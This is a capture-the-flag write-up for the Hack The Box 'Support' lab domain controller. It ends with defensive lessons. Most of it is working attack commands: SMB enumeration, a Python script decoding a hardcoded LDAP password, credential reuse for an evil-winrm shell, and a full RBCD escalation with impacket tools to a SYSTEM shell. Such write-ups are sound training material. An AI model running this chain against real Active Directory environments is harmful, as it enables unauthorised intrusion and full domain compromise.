![[Pasted image 20260929000405.png]]
![[Screenshot 2026-09-28 230614.png]]
**53/tcp — DNS (Simple DNS Plus)**  
Domain Name System. Since this is a Windows **Domain Controller**, its DNS server is integrated with Active Directory — machines and services register themselves here so other computers on the domain can find them (e.g., `support.htb`, `DC.support.htb`). This is often the first place to query to discover internal hostnames.

**88/tcp — Kerberos**  
The authentication protocol used by Active Directory instead of plain passwords over the network. Every domain login, service ticket request, etc. goes through here. It's central to lots of AD attacks (AS-REP roasting, Kerberoasting, etc.) — you'll hear about these a lot in Windows/AD machines.

**135/tcp — MSRPC (Microsoft RPC)**  
"Remote Procedure Call" endpoint mapper. Windows uses RPC internally for tons of services to talk to each other remotely (user management, scheduled tasks, etc.). Attackers often query this to enumerate what RPC services are running and sometimes to pull information about users/shares.

**139/tcp — NetBIOS Session Service**  
Legacy Windows networking protocol, predecessor to modern SMB over 445. Still around for backward compatibility. Sometimes usable for enumeration even when 445 is locked down.

**389/tcp — LDAP**  
Lightweight Directory Access Protocol — this is literally the database of the domain: users, groups, computers, organizational units, permissions. On a DC, this is a goldmine. Sometimes it allows anonymous "null" binds, meaning you can query it without any credentials at all — which is one of the first things to test.

**445/tcp — SMB (microsoft-ds)**  
File sharing protocol. Lets you browse shared folders on the server. Many real-world and HTB attacks abuse SMB — reading shares, sometimes shares contain scripts/configs with hardcoded credentials.

**464/tcp — kpasswd**  
Kerberos password change service. Lets users change their AD password. Not usually attack-relevant directly, but confirms Kerberos is fully set up.

**593/tcp — RPC over HTTP**  
Same RPC as port 135, but tunneled through HTTP (used e.g. by Outlook Anywhere in real environments). Less commonly abused but shows the RPC service is reachable a second way.

**636/tcp — LDAPS**  
LDAP, but encrypted over TLS. Same data as 389, just secured in transit.

**3268/tcp — Global Catalog LDAP**  
A special LDAP port that lets you search across an _entire forest_ (if there were multiple domains), not just one domain. On a single-DC lab box like this, functionally similar to 389.

**3269/tcp — Global Catalog LDAPS**  
Same as 3268, but encrypted.

**5985/tcp — WinRM (Windows Remote Management)**  
This is huge for you as an attacker: if you ever get valid credentials (even low-privilege), this port lets you get a **full remote PowerShell shell** on the machine (like SSH for Windows), using a tool called `evil-winrm`. This is very likely your end-goal access point once you find creds.

![[Pasted image 20260929011542.png]]![[Pasted image 20260929011816.png]]![[Pasted image 20260929011902.png|691]]


Excellent find. Most of these are just legit portable tools (7-Zip, Notepad++, PuTTY, Sysinternals, WinDirStat, Wireshark) — normal IT admin utilities, nothing special.

But one file stands out: **`UserInfo.exe.zip`**
get UserInfo.exe.zip 
 

![[Pasted image 20260929012148.png]]This confirms it — this is a **.NET application** (you can tell from the DLLs like `Microsoft.Extensions.*`, `System.Runtime.CompilerServices.Unsafe.dll`, etc. — these are standard .NET dependencies).

The good news: **.NET executables can be decompiled back into readable C# source code** almost perfectly, because .NET compiles to an intermediate language (IL) that keeps a lot of structure intact — unlike compiled C/C++ binaries.

Since `CommandLineParser.dll` is present, this tool is likely a CLI utility that takes arguments (maybe queries AD for user info, hence the name). The goal now is to **decompile `UserInfo.exe`** and read its source code, looking for:

- Hardcoded LDAP credentials
- A hardcoded username/password used to bind/query Active Directory
- Any connection strings
-Since you're on Linux/WSL (based on your terminal), the easiest option is:

1. **ILSpy** (cross-platform, has a CLI and Linux GUI version) — recommended

bash

```bash
   sudo apt install ilspycmd
   # or use the GUI AvaloniaILSpy if you have a desktop environment
```

Then:

bash

```bash
   ilspycmd UserInfo.exe -o decompiled/
```

2. Or if you have access to a Windows VM: **dnSpy** is the gold standard (GUI, lets you browse classes, set breakpoints, even debug it live).
3. ![[Pasted image 20260929012851.png]]
based on the encryption algorithme we can decrypte it using this script![[Pasted image 20260929013251.png]]
![[Pasted image 20260929013445.png]]![[Pasted image 20260929014003.png]]
ls*Evil-WinRM* PS C:\Users\support\Documents> ls
*Evil-WinRM* PS C:\Users\support\Documents> type C:\Users\support\Desktop\user.txt
b70654cd9cfdd664b6b990e1a197f46c
*Evil-WinRM* PS C:\Users\support\Documents> 


![[Pasted image 20260929015528.png]]![[Pasted image 20260929015854.png]]
![[Pasted image 20260929015903.png]]
This is the path — and it's a classic **RBCD (Resource-Based Constrained Delegation)** attack setup:

```
support (you) 
  → MemberOf → Shared Support Accounts (group)
  → GenericAll → DC.SUPPORT.HTB (the domain controller's computer object!)
```

**What this means:** The `Shared Support Accounts` group (which `support` belongs to) has **GenericAll** — full control — over the DC's own computer object in AD. That's a huge misconfiguration, and it lets you do the following attack:

1. **Create a fake computer account** (any authenticated domain user can normally add up to 10 computers to a domain by default — "MachineAccountQuota")
2. **Use your GenericAll rights** to configure the DC's `msDS-AllowedToActOnBehalfOfOtherIdentity` attribute, authorizing your fake computer to delegate on behalf of ANY user to the DC
3. **Request a Kerberos service ticket impersonating Administrator** on the DC, using your fake computer's credentials
4. Use that ticket to dump all password hashes from the DC (**DCSync**) — game over, full domain compromise
5. ![[Pasted image 20260929020015.png]]
6. ![[Pasted image 20260929020044.png]]
![[Pasted image 20260929020115.png]]
![[Pasted image 20260929020142.png]]![[Pasted image 20260929020247.png]]# HTB: Support — Full Writeup

**Target:** 10.129.147.6 (`support.htb`) **Difficulty:** Easy **OS:** Windows (Domain Controller) **Attack path:** SMB anonymous enum → .NET binary reverse engineering → custom crypto reversal → LDAP credential abuse → BloodHound path analysis → Resource-Based Constrained Delegation (RBCD) → Domain Admin

---

## 1. Reconnaissance — Nmap

bash

```bash
nmap -sCV 10.129.147.6
```

### Results

|Port|Service|Notes|
|---|---|---|
|53/tcp|DNS (Simple DNS Plus)|AD-integrated DNS|
|88/tcp|Kerberos|Domain authentication|
|135/tcp|MSRPC|RPC endpoint mapper|
|139/tcp|NetBIOS-SSN|Legacy SMB transport|
|389/tcp|LDAP|Domain: `support.htb`|
|445/tcp|SMB (microsoft-ds)|File sharing|
|464/tcp|kpasswd|Kerberos password change|
|593/tcp|RPC over HTTP|Alt RPC transport|
|636/tcp|LDAPS|Encrypted LDAP|
|3268/tcp|Global Catalog LDAP|Forest-wide LDAP|
|3269/tcp|Global Catalog LDAPS|Encrypted GC LDAP|
|5985/tcp|WinRM|Remote PowerShell access|

### What this told us

The combination of Kerberos + LDAP + SMB + a Global Catalog immediately identifies this machine as an **Active Directory Domain Controller**. The domain name was leaked directly in the LDAP service banner: `support.htb`.

The presence of **WinRM (5985)** was noted early as the most likely route to an interactive shell _once valid credentials for a user in the "Remote Management Users" group were obtained_ — this ended up being exactly correct.

**Housekeeping step:** added the domain to `/etc/hosts` so tools could resolve it by name:

bash

```bash
echo "10.129.147.6 dc.support.htb support.htb" | sudo tee -a /etc/hosts
```

---

## 2. SMB Enumeration

Checked for anonymous ("null session") SMB access — a common Windows misconfiguration where an unauthenticated user can still list/browse shares:

bash

```bash
smbclient -N -L //10.129.147.6/
```

**Result:** anonymous listing was allowed, revealing 6 shares:

|Share|Type|Notes|
|---|---|---|
|`ADMIN$`|Disk|Default hidden admin share (C:\Windows)|
|`C$`|Disk|Default hidden share for the C: drive|
|`IPC$`|IPC|Used for RPC/inter-process communication|
|`NETLOGON`|Disk|Default AD share (logon scripts)|
|`SYSVOL`|Disk|Default AD share (Group Policy objects)|
|**`support-tools`**|Disk|**Non-default, custom share — added by the box author**|

`ADMIN$`, `C$`, `IPC$`, `NETLOGON`, and `SYSVOL` are all standard, built-in Windows/AD shares. `support-tools` stood out immediately because it is **not a default share** — meaning someone deliberately created it, which made it the obvious target.

### Browsing `support-tools`

bash

```bash
smbclient -N //10.129.147.6/support-tools
smb: \> ls
```

Contents:

```
7-ZipPortable_21.07.paf.exe
npp.8.4.1.portable.x64.zip
putty.exe
SysinternalsSuite.zip
UserInfo.exe.zip      <-- stood out
windirstat1_1_2_setup.exe
WiresharkPortable64_3.6.5.paf.exe
```

Most files were legitimate, well-known portable IT admin tools (7-Zip, Notepad++, PuTTY, Sysinternals, WinDirStat, Wireshark) — all last modified on the same date (28 May 2022).

**`UserInfo.exe.zip`** was the outlier:

- Custom name, not a recognizable public tool
- Modified on a **different date** (20 Jul 2022) than every other file — a strong signal it was added deliberately, separately from the "normal" tools

This became the primary target.

Downloaded it with:

bash

```bash
smb: \> get UserInfo.exe.zip
```

---

## 3. Reverse Engineering `UserInfo.exe`

Unzipped the archive and found a folder of `.dll` files alongside `UserInfo.exe` — the presence of DLLs like `Microsoft.Extensions.DependencyInjection.dll`, `System.Runtime.CompilerServices.Unsafe.dll`, and `CommandLineParser.dll` confirmed this was a **.NET application**.

### Why .NET matters here

.NET applications compile to an intermediate bytecode language (**IL / CIL**) rather than native machine code. Unlike a C/C++ binary (which is very hard to turn back into readable source), .NET IL retains enough structure (class names, method names, variable types) that it can be **decompiled back into near-perfect, readable C# source code**. This makes .NET binaries a common and rewarding target for reverse engineering in CTFs.

### Tooling: `ilspycmd`

`ilspycmd` is the command-line version of **ILSpy**, an open-source .NET decompiler. It reads a `.NET` executable/DLL and reconstructs the original C# source code from the IL bytecode.

Installation (as a global .NET tool):

bash

```bash
dotnet tool install -g ilspycmd --version 7.2.1.6856   # pinned to match installed .NET SDK (6.0)
export PATH="$PATH:$HOME/.dotnet/tools"
```

Decompilation:

bash

```bash
mkdir decompiled
ilspycmd UserInfo.exe -o decompiled/
```

### What the decompiled source revealed

The tool was a small CLI utility (using the `CommandLineParser` library) with two subcommands:

- `find` — search AD for a user by first/last name
- `user` — print detailed info about a specific user

Internally, it connected to LDAP using a **hardcoded service account**:

csharp

```csharp
entry = new DirectoryEntry("LDAP://support.htb", "support\\ldap", password);
```

So the LDAP bind account was `support\ldap`. The password itself was **not stored in plaintext** — it was run through a custom "encryption" routine in a class called `Protected`:

csharp

```csharp
private static string enc_password = "0Nv32PTwgYjzg9/8j5TbmvPd3e7WhtWWyuPsyO76/Y+U193E";
private static byte[] key = Encoding.ASCII.GetBytes("armando");

public static string getPassword()
{
    byte[] array = Convert.FromBase64String(enc_password);
    for (int i = 0; i < array.Length; i++)
        array[i] = (byte)((uint)(array[i] ^ key[i % key.Length]) ^ 0xDF);
    return Encoding.Default.GetString(array);
}
```

### Understanding the "encryption" (it's actually just obfuscation)

This is **not real encryption** — it's a simple, reversible obfuscation scheme using XOR, which is symmetric (applying the same operation twice returns the original value). The algorithm is:

1. Base64-decode the stored string `enc_password` into raw bytes.
2. For each byte, XOR it with a repeating key (`"armando"`, cycled byte-by-byte).
3. XOR the result again with a constant, `0xDF`.
4. Interpret the resulting bytes as a string.

Because XOR is reversible and the key/constant were both hardcoded in the binary we already decompiled, we could simply **re-implement the exact same logic in Python** to recover the plaintext password:

python

```python
import base64

enc_password = "0Nv32PTwgYjzg9/8j5TbmvPd3e7WhtWWyuPsyO76/Y+U193E"
key = b"armando"

data = base64.b64decode(enc_password)
result = bytearray()
for i in range(len(data)):
    result.append((data[i] ^ key[i % len(key)]) ^ 0xDF)

print(result.decode("latin-1"))
```

**Recovered password:** `nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz`

**Credential pair obtained:** `support\ldap` : `nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz`

**Lesson:** this is a textbook example of "security through obscurity" — hiding a secret with reversible logic embedded in the same binary that uses it provides no real protection once an attacker can read the code.

---

## 4. Authenticated LDAP Enumeration

With valid domain credentials, authenticated LDAP queries expose far more data than an anonymous bind (more attributes are readable).

bash

```bash
ldapsearch -x -H ldap://10.129.147.6 \
  -D "support\ldap" \
  -w 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' \
  -b "DC=support,DC=htb" >> lalo.txt
```

This dumped the **entire directory tree** (5779 lines) to a file for offline analysis.

### Searching for stashed secrets

A classic HTB/real-world pattern: administrators sometimes store passwords or hints in free-text LDAP attributes on user objects — most commonly `description`, but also the lesser-checked **`info`** field.

bash

```bash
grep -i "description" lalo.txt     # only default, built-in AD group descriptions — dead end
grep -i "^info" lalo.txt           # jackpot
```

Result on the `support` user object:

```
cn: support
info: Ironside47pleasure40Watchful
memberOf: CN=Shared Support Accounts,CN=Users,DC=support,DC=htb
memberOf: CN=Remote Management Users,CN=Builtin,DC=support,DC=htb
```

**Credential pair obtained:** `support` : `Ironside47pleasure40Watchful`

Critically, this account is a member of **`Remote Management Users`** — the exact built-in AD group that is granted permission to connect over **WinRM**, tying directly back to port 5985 from the initial nmap scan.

---

## 5. Initial Shell via WinRM

**WinRM (Windows Remote Management)**, on port 5985, is Microsoft's remote-management protocol — functionally similar to SSH for Linux. Any account in the `Remote Management Users` group (or local Administrators) can use it to open a full interactive PowerShell session on the remote host.

Tool used: **`evil-winrm`**, the standard offensive WinRM client (Ruby-based), which wraps this protocol into a friendly interactive shell with extras like upload/download and in-memory PowerShell script execution.

bash

```bash
evil-winrm -i 10.129.147.6 -u support -p 'Ironside47pleasure40Watchful'
```

Result: an interactive PowerShell shell as `support` on the domain controller.

**User flag:**

powershell

```powershell
type C:\Users\support\Desktop\user.txt
```

```
b70654cd9cfdd664b6b990e1a197f46c
```

---

## 6. Domain Privilege-Escalation Mapping with BloodHound

`support` is a low-privilege domain user — getting to Administrator required finding a **misconfigured permission** somewhere in Active Directory. The standard tool for finding these paths is **BloodHound**, which builds a graph database of every user, group, computer, and permission relationship in the domain, then lets you query for abusable paths (e.g., "what's the shortest path from an account I own to Domain Admin?").

### Data collection: `bloodhound-python`

A Python-based collector that queries LDAP (as an authenticated user) to gather users, groups, computers, GPOs, OUs, containers, trusts, and ACLs, outputting them as JSON files that BloodHound's GUI can ingest.

bash

```bash
bloodhound-python -u ldap -p 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' \
  -d support.htb -ns 10.129.147.6 -c all
```

This produced: `_users.json`, `_groups.json`, `_computers.json`, `_domains.json`, `_gpos.json`, `_containers.json`, `_ous.json`.

### Setting up BloodHound (Kali CE stack)

Modern Kali ships **BloodHound Community Edition**, which uses:

- **Neo4j** — the graph database backing BloodHound
- **PostgreSQL** — backend storage for the BloodHound web API
- A local web UI (served on `localhost:8080`) instead of the old standalone Electron app

Setup commands used:

bash

```bash
sudo neo4j start                # starts the graph database
bloodhound-setup                # first-run setup: creates Postgres DB, links Neo4j credentials
bloodhound-start                # starts the BloodHound API + web UI
```

(Note: had to fix a Postgres "collation version mismatch" — a known Kali quirk after library upgrades — via `ALTER DATABASE ... REFRESH COLLATION VERSION`, and had to sync the Neo4j password into `/etc/bhapi/bhapi.json` so the BloodHound API could authenticate to the graph database.)

Logged into the web UI at `http://localhost:8080` (default web-UI creds `admin`/`admin`, forced password change on first login).

### Ingesting data and finding the path

1. **Quick Upload** → uploaded all the JSON files from `bloodhound-python`.
2. Searched for `SUPPORT@SUPPORT.HTB`, right-clicked the node → **"Add to Owned"** (marks it as a starting point we control) → **"Set as starting node"**.
3. Used the **Pathfinding** tab, set destination to `DOMAIN ADMINS@SUPPORT.HTB`.

### The path BloodHound revealed

```
SUPPORT@SUPPORT.HTB
  --MemberOf-->        Shared Support Accounts (group)
  --GenericAll-->       DC.SUPPORT.HTB (the Domain Controller's own computer object!)
```

**What this means:** the `Shared Support Accounts` group — which `support` belongs to — has **`GenericAll`** (full, unrestricted control) over the **computer object of the Domain Controller itself**. This is a severe misconfiguration: it means any member of that group can modify essentially any attribute of the DC's AD object, including ones that control delegation behavior — which opens the door to a **Resource-Based Constrained Delegation (RBCD)** attack.

---

## 7. Privilege Escalation — Resource-Based Constrained Delegation (RBCD)

### Background: what RBCD actually is

Kerberos supports a feature called **constrained delegation**, which lets one service impersonate a user when talking to a second service on that user's behalf (e.g., a web server impersonating you when it queries a backend database). **Resource-Based** Constrained Delegation flips who controls this: instead of the _front-end_ service declaring what it's allowed to delegate to, the _back-end_ resource (here, the DC computer object) declares **which other accounts are allowed to delegate to it**, via an attribute called:

```
msDS-AllowedToActOnBehalfOfOtherIdentity
```

If an attacker has **write access** to this attribute on a target computer (exactly what `GenericAll` grants), they can:

1. Set this attribute to point at **any account they control** (including one they just created).
2. Use that controlled account to request a Kerberos service ticket **impersonating any domain user** (including Administrator) for services on the target machine — via a two-step Kerberos extension called **S4U2Self** (self-impersonation request) followed by **S4U2Proxy** (proxying that impersonated ticket to the target service).
3. The target machine, trusting the delegation configuration, honors the ticket as if it really came from that impersonated user.

The one prerequisite is having _some_ account to name as the delegating identity. By default, AD's **`ms-DS-MachineAccountQuota`** attribute allows **any authenticated domain user to create up to 10 new computer accounts** — giving us exactly what we needed.

### Step 1 — Create a fake computer account

Tool: **Impacket's `addcomputer.py`** (invoked as `impacket-addcomputer`), which uses LDAP to register a new computer object in AD on our behalf, using the default machine-account-creation quota.

bash

```bash
impacket-addcomputer support.htb/ldap:'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' \
  -computer-name 'FAKE01$' -computer-pass 'Fakepass123!' -dc-ip 10.129.147.6
```

Result: `FAKE01$` computer account created with password `Fakepass123!`. (Any authenticated user's credentials work for this step — the `ldap` account was reused simply because we already had it.)

### Step 2 — Configure RBCD (grant `FAKE01$` delegation rights to the DC)

Tool: **Impacket's `rbcd.py`** (`impacket-rbcd`), which reads/writes the `msDS-AllowedToActOnBehalfOfOtherIdentity` attribute on a target object.

bash

```bash
impacket-rbcd -delegate-from 'FAKE01$' -delegate-to 'DC$' -dc-ip 10.129.147.6 \
  -action write support.htb/support:'Ironside47pleasure40Watchful'
```

**Important detail:** this step _must_ be run using the **`support`** account, not `ldap` — because it's `support` (via its `Shared Support Accounts` group membership) that actually holds the `GenericAll` right over the DC's computer object, as shown by BloodHound. Running it as `ldap` failed with `INSUFF_ACCESS_RIGHTS`, confirming that `ldap` had no write privilege there.

Result:

```
[*] Delegation rights modified successfully!
[*] FAKE01$ can now impersonate users on DC$ via S4U2Proxy
```

### Step 3 — Request a Kerberos ticket impersonating Administrator

Tool: **Impacket's `getST.py`** (`impacket-getST`), which performs the actual S4U2Self + S4U2Proxy Kerberos exchange, using `FAKE01$`'s own credentials to request a service ticket _as_ another user.

bash

```bash
impacket-getST -spn cifs/dc.support.htb -impersonate Administrator \
  support.htb/'FAKE01$':'Fakepass123!' -dc-ip 10.129.147.6
```

This produces a `.ccache` file (a cached Kerberos ticket) named:

```
Administrator@cifs_dc.support.htb@SUPPORT.HTB.ccache
```

This file contains a valid Kerberos ticket for the `cifs` service on the DC, **issued in the name of Administrator** — even though we never had Administrator's actual password.

### Step 4 — Use the ticket to get a shell

Told our tools to use this cached ticket instead of a password, by setting the standard Kerberos environment variable:

bash

```bash
export KRB5CCNAME=Administrator@cifs_dc.support.htb@SUPPORT.HTB.ccache
```

Then used **Impacket's `psexec.py`** (`impacket-psexec`) — a remote-command-execution tool that (given sufficient rights) uploads a temporary service binary to the target over SMB, installs it as a Windows service, and uses it to spawn an interactive `cmd.exe` shell:

bash

```bash
impacket-psexec -k -no-pass support.htb/administrator@dc.support.htb -dc-ip 10.129.147.6
```

(`-k` tells Impacket to use Kerberos authentication using our `KRB5CCNAME` ticket instead of a password; `-no-pass` confirms no password is being supplied.)

Result: a `cmd.exe` shell running as **NT AUTHORITY\SYSTEM / Administrator** on the domain controller.

**Root flag:**

cmd

```cmd
type C:\Users\Administrator\Desktop\root.txt
```

```
1c711f1597476322d270ed2d64282053
```

---

## 8. Full Attack Chain Summary

```
Anonymous SMB access
   → Found custom "support-tools" share
      → Downloaded UserInfo.exe.zip
         → Identified as .NET app, decompiled with ilspycmd
            → Found hardcoded LDAP creds, protected by reversible XOR obfuscation
               → Reversed the obfuscation in Python → recovered support\ldap password
                  → Authenticated LDAP dump
                     → Found plaintext-like password in support user's "info" attribute
                        → support user is in "Remote Management Users" → WinRM access
                           → evil-winrm shell as support (USER FLAG)
                              → BloodHound: support -> GenericAll -> DC computer object
                                 → Created fake computer account (impacket-addcomputer)
                                    → Configured RBCD abusing GenericAll (impacket-rbcd)
                                       → Requested Administrator ticket via S4U2Self/S4U2Proxy (impacket-getST)
                                          → impacket-psexec with the ticket → SYSTEM shell (ROOT FLAG)
```

## 9. Tools Used — Quick Reference

|Tool|Purpose|
|---|---|
|`nmap`|Port/service scanning and version detection|
|`smbclient`|Anonymous SMB share listing and file download|
|`ilspycmd` (ILSpy)|Decompiling .NET binaries back to C# source|
|`ldapsearch`|Querying Active Directory over LDAP|
|`evil-winrm`|Interactive PowerShell shell over WinRM|
|`bloodhound-python`|Collecting AD relationship/permission data via LDAP|
|Neo4j + BloodHound CE|Graph database + UI for finding privilege-escalation paths|
|`impacket-addcomputer`|Registering a new AD computer account|
|`impacket-rbcd`|Reading/writing Resource-Based Constrained Delegation config|
|`impacket-getST`|Requesting Kerberos S4U2Self/S4U2Proxy service tickets|
|`impacket-psexec`|Remote command execution via SMB/Service Control Manager|

## 10. Key Takeaways / Lessons

- **Anonymous SMB access should be disabled** — it was the entry point for the entire chain.
- **Never store secrets in application binaries**, even "encrypted" ones — any reversible algorithm (especially XOR with a hardcoded key) offers no real protection once the binary is in an attacker's hands.
- **The `info` and `description` AD attributes are commonly misused** to store notes or credentials in plaintext and should be audited regularly.
- **`GenericAll` over a computer object is equivalent to controlling that machine's identity** in Kerberos delegation terms — this single ACL misconfiguration was the entire privilege-escalation path.
- **RBCD is a powerful, often-overlooked privilege escalation primitive**: it doesn't require any special group membership (like Domain Admins) — just write access to one attribute on a target computer object, plus the default ability every domain user has to create a small number of computer accounts